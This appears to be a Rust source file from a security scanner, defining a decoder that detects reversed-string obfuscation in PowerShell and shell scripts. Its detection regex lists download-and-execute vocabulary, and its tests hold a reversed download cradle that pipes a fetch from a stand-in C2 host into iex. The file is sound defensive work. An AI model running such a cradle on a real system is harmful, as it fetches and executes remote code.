use super::Decoder;
use crate::util::re;
use regex::Regex;
use std::sync::LazyLock;

/// String reversal: `-join $s[-1..-$s.Length]`, `[array]::Reverse`, `| rev`.
///
/// We cannot evaluate the reversal (that needs variable state), so instead we look for
/// quoted literals whose *reverse* contains execution vocabulary that the forward text
/// does not. Only fires when a reversal idiom is present somewhere in the input, so a
/// random palindrome-ish string in benign text is never flipped.
pub struct ReverseDecoder;

static IDIOM: LazyLock<Regex> = LazyLock::new(|| {
    re(r"\[-1\s*\.\.|\[array\]::reverse|\|\s*rev\b|\.reverse\(\)|strreverse\(|\[::-1\]")
});
static LITERAL: LazyLock<Regex> = LazyLock::new(|| re(r#"'([^'\n]{8,})'|"([^"\n]{8,})""#));
static VOCAB: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"https?://|\b(?:iex|iwr|irm|invoke-|powershell|mshta|curl|wget|bash|downloadstring|net\.webclient|frombase64string|start-process|cmd)\b",
    )
});

impl Decoder for ReverseDecoder {
    fn name(&self) -> &'static str {
        "reverse"
    }
    fn try_decode(&self, input: &str) -> Option<String> {
        if !IDIOM.is_match(input) {
            return None;
        }
        let mut changed = false;
        let out = LITERAL.replace_all(input, |c: &regex::Captures| {
            let (q, body) = match (c.get(1), c.get(2)) {
                (Some(m), _) => ('\'', m.as_str()),
                (_, Some(m)) => ('"', m.as_str()),
                _ => return c[0].to_string(),
            };
            let rev: String = body.chars().rev().collect();
            if VOCAB.is_match(&rev) && !VOCAB.is_match(body) {
                changed = true;
                format!("{q}{rev}{q}")
            } else {
                c[0].to_string()
            }
        });
        changed.then(|| out.into_owned())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn flips_reversed_payload() {
        let s = "$r='xei | x/dilavni.2c//:sptth mri';iex(-join $r[-1..-$r.Length])";
        let out = ReverseDecoder.try_decode(s).unwrap();
        assert!(out.contains("'irm https://c2.invalid/x | iex'"), "{out}");
    }
    #[test]
    fn needs_idiom() {
        assert!(ReverseDecoder
            .try_decode("echo 'xei | x/dilavni.2c//:sptth mri'")
            .is_none());
    }
}
